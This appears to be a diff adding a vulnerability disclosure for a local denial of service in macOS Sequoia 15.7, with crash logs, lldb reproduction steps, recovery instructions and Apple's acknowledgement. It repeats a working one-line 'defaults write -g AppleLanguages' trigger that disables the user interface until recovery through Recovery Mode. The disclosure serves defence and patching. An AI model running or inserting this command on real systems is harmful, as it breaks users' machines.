@@ -1,0 +1,141 @@
+# Denial-of-Service on AppKit-based apps via null pointer dereference on global localization variables
+
+## Summary
+
+macOS Sequoia 15.7 and lower are vulnerable to a local Denial of Service vulnerability via a null pointer dereference by abusing the format used to store variables. This is a regression for CVE-2025-24199. 
+
+## Explanation
+
+The vulnerability is triggered when the `AppleLanguages` global variable, which takes arrays as inputs, is set with the syntax that would be used for a string-based variable. The correct way to set this variable is
+
+`defaults write -g AppleLanguages '("en_US")'`
+
+, while the vulnerable way abused non-printable characters and the `eval()` built-in Bash/ZSH function
+
+`$(echo "defaults write -g AppleLanguages '(\"\\0\")'")`
+
+Note that we are following the syntax for setting up an array. 
+
+This value is then stored on the following .plist files:
+* `$HOME/Library/Preferences/.GlobalPreferences.plist`
+* `$HOME/Library/Preferences/.GlobalPreferences_m.plist`
+
+After setting the global variable to any value (`\0` was used) and upon debugging a process like `System Settings.app`, the behavior detected is that the `CFPreferencesCopyValue` function on `CoreFoundation.dylib` will return the payload as a NSCFString value. Immediately after, `count` would be called on it with `objc_msgSend`. This leads to a segmentation fault caused by a null pointer dereference. Below is an extract of the fault from a crash log, also attached to this report.
+
+```
+"vmRegionInfo" : "0x2aea is not in any region. Bytes before following region: 4305884438\n REGION TYPE START - END [ VSIZE] PRT\/MAX SHRMOD REGION DETAIL\n UNUSED SPACE AT START\n---> \n __TEXT 100a6c000-100ba8000 [ 1264K] r-x\/r-x SM=COW \/System\/Applications\/System Settings.app\/Contents\/MacOS\/System Settings",
+
+"exception" : {"codes":"0x0000000000000001, 0x0000000000002aea","rawCodes":[1,10986],"type":"EXC_BAD_ACCESS","signal":"SIGSEGV","subtype":"KERN_INVALID_ADDRESS at 0x0000000000002aea"},
+
+"termination" : {"flags":0,"code":11,"namespace":"SIGNAL","indicator":"Segmentation fault: 11","byProc":"exc handler","byPid":768},
+
+"vmregioninfo" : "0x2aea is not in any region. Bytes before following region: 4305884438\n REGION TYPE START - END [ VSIZE] PRT\/MAX SHRMOD REGION DETAIL\n UNUSED SPACE AT START\n---> \n __TEXT 100a6c000-100ba8000 [ 1264K] r-x\/r-x SM=COW \/System\/Applications\/System Settings.app\/Contents\/MacOS\/System Settings",
+
+"extMods" : {"caller":{"thread_create":0,"thread_set_state":0,"task_for_pid":0},"system":{"thread_create":0,"thread_set_state":0,"task_for_pid":0},"targeted":{"thread_create":0,"thread_set_state":0,"task_for_pid":0},"warnings":0},
+```
+
+# Steps to reproduce
+
+1. From the Terminal, change the AppleLanguages global variables with the following payload:
+
+`$(echo "defaults write -g AppleLanguages '(\"\\0\")'")`
+
+2. Open `System Settings.app` or reload the Dock application from the Apple logo menu.
+
+3. The payload will be executed.
+
+## Reproduction from the `lldb` debugger
+
+1. Start `lldb` with the `System Settings.app` binary as a parameter.
+
+`ldb /System/Applications/System\ Settings.app/Contents/MacOS/System\ Settings`
+
+2. On another terminal, change the AppleLanguage global variable
+
+`$(echo "defaults write -g AppleLanguages '(\"\\0\")'")`
+
+3. Create breakpoint at the CreatePlist function, which is right before the faulting instruction.
+
+`breakpoint set --name createPlist`
+
+4. Run the application and step through the few instructions before hitting the faulting instruction.
+
+# Recovery steps
+
+1. Reboot the device into Recovery Mode
+2. Unlock the user and hard drive
+3. Remove the following files from `/Volumes/Data/Users/username/Library/Preferences/`:
+* `./ByHost/com.apple.loginwindow.plist`
+* `./loginwindow.plist`
+* `/Volumes/Data/System/Volumes/Data/private/var/root/Library/Preferences/.GlobalPreferences.plist`
+
+4. Shutdown or restart the device.
+
+# Expected behavior
+Under normal circumstances, the macOS GUI should behave normally and open any AppKit-based application, like `System Settings.app`.
+# Actual behavior
+An UI corruption happens in form of the Dock application being abruptly terminated, and the UI ending up disabled to any user input after a cold reboot.
+# Crash dump
+The crash happens at the `+[NSLocale(NSLocale_LanguageExtras) __effectiveLanguageForBundle:]` method.
+
+```
+0 CoreFunction 0x000000018176b2ec __exceptionPreprocess + 176
+1 libobjc.A.dylib 0x0000000181252788 objc_exception_throw + 60
+2 CoreFoundation 0x000000018181d56c -[NSObject (NSObject) __retain_OA] + 0
+3 CoreFoundation 0x00000001816d4f3c _forwarding + 1580
+4 CoreFoundation 0x00000001816d4850 _CF_forwarding_prep_0 + 96
+5 Foundation 0x0000000182f25770 +[NSLocale(NSLocale_LanguageExtras) __effectiveLanguageForBundle:] + 88
+6 IconServices 0x000000018fbdd380 +[NSLocale (IconServicesAdditions) _IS_currentLanguageDirection] + 32
+7 IconServices 0x000000018fb9a8b0 -[ISImageDescriptor initWithSize:scale:] + 108
+8 AppKit 0x000000018fb9a8b0 NSISIconImageRepGetCGImage + 112
+9 AppKit 0x0000000185066014 __74-[NSImageRep drawInRect:fromRect:operation:fraction:respectFlipped:hints:]_block_invoke + 612
+10 AppKit 0x0000000185066754 -INSImageRep drawInRect: fromRect: operation: fraction:respectFlipped:hints:] + 628
+11 AppKit 0x0000000185570004 __71-[NSImage drawInRect: fromRect:operation: fraction:respectFlipped:hints:]_block_invoke.1392 + 680
+12 AppKit 0x000000018504e700 -[NSImage _usingBestRepresentationForRect:context:hints:body:] + 148
+13 AppKit 0x0000000185066434 -[NSImage drawInRect:fromRect:operation:fraction:respectFlipped:hints:] + 1328
+14 AppKit 0x0000000185570354 -[NSImage drawInRect :withState:backgroundStyle:tintColor:operation:fraction:flip:hints:] + 312
+15 AppKit 0x0000000185477d90 __22-[NSControl drawRect:]_block_invoke + 96
+16 AppKit 0x000000018506d9a4 -[NSControl drawRect:] + 152
+17 AppKit 0x000000018506d7d4 _NSViewDrawRect + 124
+18 AppKit 0x00000001859fecf0 -[NSView _recursive:displayRectIgnoring0pacity:inContext:stopAtLayerBackedViews:] + 1088
+19 AppKit 0x000000018506d1d8 -[NSView(NSLayerKitGlue) _drawViewBackingLayer:inContext:drawingHandler:] + 556
+20 AppKit 0x00000001855a1f80 -[NSViewBackingLayer drawInContext:] + 56
+21 AppKit 0x000000018530a444 block_destroy_helper.34 + 20096
+22 AppKit 0x000000018532c8ec _swift_stdlib_malloc_size + 37128
+23 AppKit 0x00000001852da840 _NSCDisplayListGetHash + 3072
+24 AppKit 0x000000018532c4e8 _swift_stdlib malloc_size + 36100
+25 AppKit 0x0000000185329e84 _swift_stdlib_malloc_size + 26272
+26 AppKit 0x000000018530a0c8 block_destroy_helper.34 + 19204
+27 AppKit 0x000000018530a4a4 block_destroy_helper.34 + 20192
+28 AppKitv 0x0000000185521bb4 -[NSViewBackingLayer display] + 1272
+29 QuartzCore 0x0000000189904428 _ZN2CA5Layer17display_if_neededEPNS_11TransactionE + 744
+30 QuartzCore 0x0000000189a891a4 _ZN2CA7Context18commit_transactionEPNS_11TransactionEdPd + 512
+31 QuartzCore 0x00000001898e6e4c _ZN2CA11Transaction6commitEv + 648
+32 AppKit 0x000000018507c9d0 __62+[CATransaction(NSCATransaction) NS_setFlushesWithDisplayLinkJ_block_invoke + 272
+33 AppKit 0x0000000185a3c208 ___NSRunLoopObserverCreateWithHandler_block_invoke + 64
+34 CoreFoundation 0x00000001816f587c __CFRUNLOOP_IS_CALLING_OUT_TO_AN_OBSERVER_CALLBACK_FUNCTION__ + 36
+35 CoreFoundation 0x00000001816f5768 __CFRunLoopDoObservers + 536
+36 CoreFoundation 0x00000001816f4d94 __CFRunLoopRun + 776
+37 CoreFoundation 0x00000001816f4434 CFRunLoopRunSpecific + 608
+38 HIToolBox 0x000000018be9819c RunCurrentEventLoopInMode + 292
+39 HIToolBox 0x000000018be97fd8 ReceiveNextEventCommon + 648
+40 HIToolBox 0x000000018be97d30 _BlockUntilNextEventMatchingListInModeWithFilter + 76
+41 AppKit 0x0000000184f53d68 _DPSNextEvent + 660
+42 AppKit 0x0000000185749808 -[NSApplication(NSEventRoutig) _nextEventMatchingEventMask:untilDate:Mode:dequeue:] + 700
+43 AppKit 0x0000000184f4709c -[NSApplication run] + 476
+44 AppKit 0x0000000184f1e2e0 NSApplicationMain + 880
+45 dyld 0x000000018128e0e0 start + 2360
+```
+
+Details of the logged error with the `__NSCFString` memory address that can store a particular payload:
+
+```
+"exceptionReason" : {"arguments":["__NSCFString","count","0x15d1063f0"],"format_string":"-[%s %s]: unrecognized selector sent to instance %p","name":"NSInvalidArgumentException","type":"objc-exception","composed_message":"-[__NSCFString count]: unrecognized selector sent to instance 0x15d1063f0","class":"NSException"}
+```
+
+# Proof of Concept
+Proof of concept video with impact and recovery demo available [here](https://youtu.be/OiqrZ2BIBLU).
+
+# Apple acknowledgement
+
+https://support.apple.com/en-us/125110
